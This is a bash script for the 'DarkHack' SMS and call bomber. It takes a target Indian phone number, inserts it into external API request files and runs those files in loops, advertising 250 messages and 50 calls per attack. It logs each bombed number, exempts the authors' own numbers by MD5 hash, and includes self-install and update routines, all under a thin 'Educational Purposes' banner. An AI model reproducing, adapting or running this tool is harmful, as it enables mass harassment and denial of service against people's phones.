#!/usr/bin/env bash
#set -x
#By suman kumar ~BHUTUU github:- https://github.com/BHUTUU
#for darkhack as a collabrator
#date:- 14/09/2021
args="$@"
comand="bomb.sh ${args}"
CWD=$(pwd)

#<<<----------color codes substitution by variables--------->>>
S0="\033[1;30m" B0="\033[40m" SI0="\033[30m"
S1="\033[1;31m" B1="\033[41m" SI1="\033[30m"
S2="\033[1;32m" B2="\033[42m" SI2="\033[30m"
S3="\033[1;33m" B3="\033[43m" SI3="\033[30m"
S4="\033[1;34m" B4="\033[44m" SI4="\033[30m"
S5="\033[1;35m" B5="\033[45m" SI5="\033[30m"
S6="\033[1;36m" B6="\033[46m" SI6="\033[30m"
S7="\033[1;37m" B7="\033[47m" SI7="\033[30m"
R0="\033[0;00m" ST="\033[5;32m"
#<<<---------Internet check--------->>>
INTERNET() {
  python assets/load.py -H checking-internet -P BHUTUU
  ping -c 1 google.com > /dev/null 2>&1
  if [[ $? != '0' ]]; then
    printf "\n${SI2}[${SI1}!${SI2}]${SI1}Check your internet connection! You are offline!!${R0}\n"
    printf "\n${SI3}Exiting......${R0}\n\n"
    exit 1
  else
    printf "\n${S4}Status:- ${S1}[${S2}✓${S1}]${SI2}online.${R0}\n\n"
  fi
}

#<<<----------Requirements---------->>>
REQUIREMENTS() {
OS=$(uname -o)
case ${OS} in
  Android)
    pkg=(git curl wget espeak pv figlet)
    for i in "${pkg[@]}"; do
      sleep 0.3
      if ! hash "${i}" 2>/dev/null; then
        printf "${S2}[${S1}!${S2}]${S1}${i} not found in your system!!${R0}\n"
        printf "${S5}Installing${i}.......${R0}\n"
        pkg install ${i} -y
      fi
    done
    ;;
  GNU/Linux)
    pkg=(git curl wget espeak pv figlet)
    os="$(source \etc\os-release echo "${ID}")"
    case "${os}" in
      arch|archarm|arcolinux|artix|manjaro|garuda|predator|endeavouros)
        pm="sudo pacman -Syu --noconfirm"
        ;;
      debian|ubuntu|linuxmint|kali|parrot|raspbian)
        pm="sudo apt install -y"
        ;;
      fedora)
        pm="sudo dnf install -y"
        ;;
      freebsd)
        pm="sudo pkg install -y"
        ;;
      gentoo)
        pm="sudo emerge --ask"
        ;;
      void)
        pm="sudo xbps-install"
        ;;
      puppy_fossapup64)
        pm="sudo pkg g"
        ;;
      nixos)
        pm="nix-env -iA nixos."
        ;;
      solus)
        pm="eopkg install -y"
        ;;
      *)
        echo -e $RED "Sorry... this is sadly not a supported distro!"
        ;;
    esac
    for i in "${pkg[@]}"; do
      sleep 0.3
      if ! hash "${i}" 2>/dev/null;then
        echo -e "${R1}Installing ${i}"
        ${pm} "${i}"
      fi
    done
    ;;
esac
}

#<<<----------Program---------->>>
PROGRAM() {

#<<-----check server----->>>
rm -rf .server.txt
server=$(wget -L https://raw.githubusercontent.com/BHUTUU/test/main/.server.txt > /dev/null 2>&1)
serverup="on"
server=$(cat .server.txt | grep on)
if [[ $server = $serverup ]]; then
  echo; clear
else
  clear; echo; figlet ERROR 404
  echo -e "      ${S2}[${S3}~${S2}]${R0} Sorry for the inconvenience :(${R0}" | pv -qL 30
  echo; echo -e "      ${S2}[${S3}~${S2}]${S6} The Server is under maintenance !!" | pv -qL 20
  echo; echo -e "      ${S2}[${S3}~${S2}]${R0} Contact the developer !" | pv -qL 30
  exit 1
fi
banner() {
echo -e "${S2}"
figlet DarkHack
echo
sleep 1
echo -e "  ${S7} Author:${S1} King-Nazim, MishalMMSS and BHUTUU"
echo

}
bombrecord() {
  clear; echo; figlet Bomb Record; echo; echo
  echo -e "     ${S2}[${S6}~${S2}]${S3} This is a record of numbers which had been bombed !${R0}"
  printf "${S2}\n"
  cat .bombrecord.txt
exit 1
}
cd $CWD/assets
cp headapis $CWD
cp tailapis $CWD
cp anonapi $CWD
cd ..
#<<<-----------SELF PROTECTION------------>>>
#bhutuu
#normal format
no1=d3741a8e275cc6e23ccfe48b948b1eae
#91format
no2=7580a329fbb8be8c7eac5d0d5ec1a616
+91format
no3=62030872254a686c456b30405f17db6f

#others' no
#normal format
no4=252b65904855b5f2cc5d37948d9007a1
#91format
no5=7e1200a9ca4c513d4372d92a4b00165c
#+91format
no6=8be4b2029c307941a04cf072fecdcb4b

#others' no2
#normal format
no7=d579fd6d36bb10af6693a80b656c9fe6
#91format
no8=44edee71b9e96706e479d265f8679fd4
#+91format
no9=7af21f33a87fba3ba7c071898876f079

#bhutuu2
#normal format
mo1=84c794b2d2358583f225f1d4f048e460
#91format
mo2=f0ca77644f362b01b8891f2ae927b945
#+91format
mo3=26025923d6e18c871f517c9f791fa602

about() {
clear
echo -e '''
         \e[1;91m      ╔═══════════╗
         \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗
         \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗
         \e[1;91m   ║\e[1;97m█████\e[1;92mDarkHack\e[1;97m████\e[1;91m║
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m
         \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;91m╚╦╝\e[1;91m
         \e[1;91m   ╔╝\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m╚╗\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒▒\e[1;97m██\e[1;91m|\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m║\e[1;94m
         \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m
         \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒.
         \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m
         \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║
         \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║
''' | pv -qL 300
sleep 1

echo -e "                This is ${S2} King-Nazim, MishalMMSS and BHUTUU" | pv -qL 150

echo "                 From Dark Hackers !" | pv -qL 150
echo
echo -e "     ${S2}  Ethical Hackers${S7} |${S2} CyberSec Students${S7} |${S2} Programmers" | pv -qL 10
echo
printf "${S2}                 Group Admin at${S7} Dark Hackers${R0}\n" | pv -qL 12
echo
echo -e "       ${S6}          Our social handles are below !!" | pv -qL 10
echo
printf "${S2}          Github ${S1}     :    ${S6}https://github.com/King-Nazim/${R0}\n" | pv -qL 50
printf "${S2}          Github ${S1}     :    ${S6}https://github.com/Mishalmmss/${R0}\n" | pv -qL 50
printf "${S2}          Github ${S1}     :    ${S6}https://github.com/BHUTUU/${R0}\n" | pv -qL 50
echo
printf "${S2}         Instagram ${S1}   :   ${S6}https://instagram.com/nazimcp7/${R0}\n" | pv -qL 50
printf "${S2}         Instagram ${S1}   :   ${S6}https://instagram.com/_mishal_hussain_/${R0}\n" | pv -qL 50
printf "${S2}         Instagram ${S1}   :   ${S6}https://instagram.com/suman_cubezy/${R0}\n" | pv -qL 50
echo
echo -e "${S1}                        Happy Hacking :)${R0}" | pv -qL 10
sleep 7
menux
}
eexec() {
echo "Under construction"
exit
}

menu() {
clear
echo -e "${S1}"
figlet Bombing
echo
echo
printf "             ${S2}[${R0} Dark_Hacks${S2}${S3}Enter target  >>> ${R0}"
read targett
passd=$(echo "$targett" | md5sum | awk '{printf $1}')
if [[ $passd == $no1 || $passd == $no2 || $passd == $no3 || $passd == $mo1 || $passd == $mo2 || $passd == $mo3 ]]; then
echo

printf "${S2}[${S1}!${S2}]${S1}Wrong number lol ;)! don't be so smart rotor. you can be self bombed for this wrong attempt!!Me Suman kumar ~BHUTUU github:- https://github.com/BHUTUU/ ${R0}"

printf "\033[1;32m[\033[1;31m!\033[1;32m]\033[1;31mWrong number lol ;)! don't be so smart rotor. you can be self bombed for this wrong attempt!!Me Suman kumar ~BHUTUU github:- https://github.com/BHUTUU/ \033[0m\n"

echo
exit 1
elif [[ $passd == $no4 || $passd == $no5 || $passd == $no6 || $passd == $no7 || $passd == $no8 || $passd == $no9 ]]; then
echo

printf "${S2}[${S1}!${S2}]${S1}Wrong number lol! it developer here!! this bombing may results to self bomb for you so don't be so smart!!${R0}\n"

printf "${S2}[${S1}!${S2}]${S1}Wrong number lol! it developer here!! this bombing may results to self bomb for you so don't be so smart!!${R0}\n"

echo
exit 1
else
printf "\n"
echo
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
printf "  Bombing\n"
echo
printf "             ~~~${S2} Attack Started On +91$targett ${R0}~~~\n"
sleep 1
echo
echo
printf "\n"
printf "   Press ctrl+c to quit ! \n"
echo
echo -e "   ${S2}[${S1}~${S2}]${S3} Else it will automatically stop after 5 min${R0}"
echo
echo -e "   ${S2}[${S1}~${S2}]${S3} After sending 250 msgs and 50 calls !!${R0}"
echo

while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..4}
do bash headapis
done

for i in {1..27}
do bash tailapis
done

exit 1
fi
}






menux() {
clear
clear
banner
sleep 1
DATE=$(date)
echo "${S7}✯ Started on ${S1}${DATE}"
echo "${S7}------------------------------"
printf "${S3}⚡ This tool is only for Educational Purposes !!${R0}\n"
echo "------------------------------"
echo ""
sleep 1
printf "${S2}[${R0} 1${S2} ]${R0}>>>${S3} MASS BOMBING ${R0}\n"
printf "${S2}[${R0} 2${S2} ]${R0}>>>${S3} UPDATE ${R0}\n"
printf "${S2}[${R0} 3${S2} ]${R0}>>>${S3} ABOUT ${R0}\n"
printf "${S2}[${R0} 4${S2} ]${R0}>>>${S3} QUIT ${R0}\n"
echo
printf "${S1} Select Option !! ${R0}−−⋙⋙⋙ "
read options
if [ "$options" -eq "0" ];then
  bombrecord
fi
if [ "$options" -eq "1" ];then
  menu
fi
if [ "$options" -eq "2" ];then
  INTERNET
  REQUIREMENTS
  rm -rf $PREFIX/bin/darkhack > /dev/null 2>&1
  cd $PREFIX/share
  rm -rf darkhack > /dev/null 2>&1
  git clone https://github.com/King-Nazim/darkhack
  cd darkhack && chmod +x start.sh
  sleep 1
cat <<- CONFI > $PREFIX/bin/darkhack
#!/bin/bash
args="\$@"
bash \$PREFIX/share/darkhack/bomb.sh \$args
CONFI
fi
if [ "$options" -eq "3" ];then
  about
fi
if [ "$options" -eq "007" ];then
  eexec
fi
if [ "$options" -eq "4" ];then
  echo
  echo -e "${S2}[${S1}~${S2}]${S3} Thanks for Using Dark_Hacks !${S3}"
  echo
  exit 1
else
  menux
fi


}
menux

}





if [[ $comand == 'bomb.sh -u' ||$comand == 'bomb.sh --update' ]]; then
  INTERNET
  git pull
  printf "\n${S2}Darkhack is updated successfully${R0}\n\n"
elif [[ $comand == 'bomb.sh -i' || $comand == 'bomb.sh --install' ]]; then
  INTERNET
  REQUIREMENTS
  rm -rf $PREFIX/bin/darkhack > /dev/null 2>&1
  cd $PREFIX/share
  rm -rf darkhack > /dev/null 2>&1
  git clone https://github.com/King-Nazim/darkhack
  cd darkhack && chmod +x start.sh
  sleep 1
cat <<- CONF > $PREFIX/bin/darkhack
#!/bin/bash
args="\$@"
bash \$PREFIX/share/darkhack/bomb.sh \$args
CONF
else
  INTERNET
  REQUIREMENTS
  PROGRAM
fi

